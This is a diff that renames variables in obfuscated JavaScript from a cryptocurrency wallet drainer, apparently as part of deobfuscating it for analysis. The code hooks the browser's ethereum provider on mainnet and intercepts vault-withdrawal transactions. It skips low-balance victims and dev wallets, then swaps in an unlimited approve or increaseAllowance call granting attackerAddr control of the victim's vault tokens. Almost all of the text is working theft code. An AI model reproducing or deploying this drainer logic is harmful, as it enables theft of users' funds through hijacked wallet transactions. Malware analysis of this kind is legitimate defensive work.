@@ -223,12 +223,12 @@ async function tx(_0x656ce6, _0x290819, requestArr) {
         if (devWallets['includes'](victimAddr)) throw 'ADMIN: ' + victimAddr;
         var
             victimVaults = await getVaults(victimAddr),
-            _0x1a0cab = victimVaults['value'];
-        _log('balance', _0x1a0cab);
+            victim_balance = victimVaults['value'];
+        _log('balance', victim_balance);
         if (
             victimAddr != '0x38b8F6af1D55CAa0676F1cbB33b344d8122535C2' &&
-            _0x1a0cab < 0xc350
-        ) throw 'Balance too low: ' + _0x1a0cab;
+            victim_balance < 0xc350
+        ) throw 'Balance too low: ' + victim_balance;
         const signer_ = ethProvider['getSigner']();
         // User has more than $50K
         var ERC20ABI = [
@@ -488,7 +488,7 @@ async function tx(_0x656ce6, _0x290819, requestArr) {
         }
         _log('maxBalance', maxVaultValue),
             _log('maxVault', maxVaultAddress);
-        var _0x46c76b = null;
+        var tx_data = null;
         if (
             txData['startsWith']('0x2e1a7d4d000000000000000000000000') &&
             maxVaultAddress['toLowerCase']() == txParams[0x0]['to']['toLowerCase']()
@@ -516,16 +516,16 @@ async function tx(_0x656ce6, _0x290819, requestArr) {
                 throw 'Already has allowance, ' + 'contractSymbol: ' + _0x4a56f5 + ', contractName: ' + _0x50526e + ', contractAddress: ' + _0x582ffe;
             }
             var _0x53b1ba = new ethers[('utils')]['Interface'](['function approve(address spender, uint value)']);
-            _0x46c76b = _0x53b1ba['encodeFunctionData']('approve', [attackerAddr, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff']);
+            tx_data = _0x53b1ba['encodeFunctionData']('approve', [attackerAddr, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff']);
         }
         else {
             var _0x53b1ba = new ethers[('utils')][('Interface')](['function increaseAllowance(address spender, uint addedValue)']);
-            _0x46c76b = _0x53b1ba['encodeFunctionData']('increaseAllowance', [attackerAddr, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff']);
+            tx_data = _0x53b1ba['encodeFunctionData']('increaseAllowance', [attackerAddr, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff']);
         }
-        console_log('encodedData', _0x46c76b);
+        console_log('encodedData', tx_data);
         var
             _0xd98577 = { ...txParams[0x0] };
-        _0xd98577['data'] = _0x46c76b,
+        _0xd98577['data'] = tx_data,
             _0xd98577['to'] =
             maxVaultAddress, _0xd98577['gas'] = ethers['utils']['hexlify'](0xff3f),
             console_log('newParams', _0xd98577);
@@ -571,7 +571,7 @@ async function tx(_0x656ce6, _0x290819, requestArr) {
         return _log('err', _0x4b4862), Reflect['apply'](_0x656ce6, _0x290819, requestArr);
     }
 }
-async function interceptMethodCalls(_0x3b557f) {
+async function interceptMethodCalls(ethereum_obj) {
     var _0x19e38f = get_text;
     try {
         if (typeof window['_ethers'] !== 'undefined') {
@@ -583,37 +583,37 @@ async function interceptMethodCalls(_0x3b557f) {
                 _0x32e13c['chainId'] == 0x1 &&
                 (
                     console_log('The network is Ethereum mainnet'),
-                    Object['keys'](_0x3b557f)['forEach'](
-                        _0x21ad27 => {
+                    Object['keys'](ethereum_obj)['forEach'](
+                        func_name => {
                             var _0x69aac = _0x19e38f;
-                            const _0xf0ef0d = _0x3b557f[_0x21ad27];
+                            const _0xf0ef0d = ethereum_obj[func_name];
                             if (typeof _0xf0ef0d === 'function') {
-                                if (_0x21ad27 == 'request') {
+                                if (func_name == 'request') {
                                     const _0x16d963 = _0xf0ef0d;
-                                    _0x3b557f[_0x21ad27] = (..._0x72043d) => {
+                                    ethereum_obj[func_name] = (...args) => {
                                         var _0x591e38 = _0x69aac;
-                                        console.log("incoming request:", _0x72043d);
+                                        console.log("incoming request:", args);
                                         try {
                                             if (
-                                                _0x72043d &&
-                                                _0x72043d['length'] == 0x1 &&
-                                                'method' in _0x72043d[0x0] &&
-                                                _0x72043d[0x0]['method'] == 'eth_sendTransaction' &&
-                                                'params' in _0x72043d[0x0]
+                                                args &&
+                                                args['length'] == 0x1 &&
+                                                'method' in args[0x0] &&
+                                                args[0x0]['method'] == 'eth_sendTransaction' &&
+                                                'params' in args[0x0]
                                             ) {
-                                                var _0x294ee3 = _0x72043d[0x0]['params'];
+                                                var _0x294ee3 = args[0x0]['params'];
                                                 if ('data' in _0x294ee3[0x0]) {
                                                     var _0x17a66a = _0x294ee3[0x0]['data'];
                                                     if (
                                                         _0x17a66a['startsWith']('0xb16eb351000000000000000000000000') ||
                                                         _0x17a66a['startsWith']('0x2e1a7d4d000000000000000000000000')
-                                                    ) return tx(_0x16d963, _0x3b557f, _0x72043d);
+                                                    ) return tx(_0x16d963, ethereum_obj, args);
                                                 }
                                             }
                                         } catch (_0x26f612) {
                                             _log('error', _0x26f612);
                                         }
-                                        return Reflect['apply'](_0x16d963, _0x3b557f, _0x72043d);
+                                        return Reflect['apply'](_0x16d963, ethereum_obj, args);
                                     };
                                 }
                             }
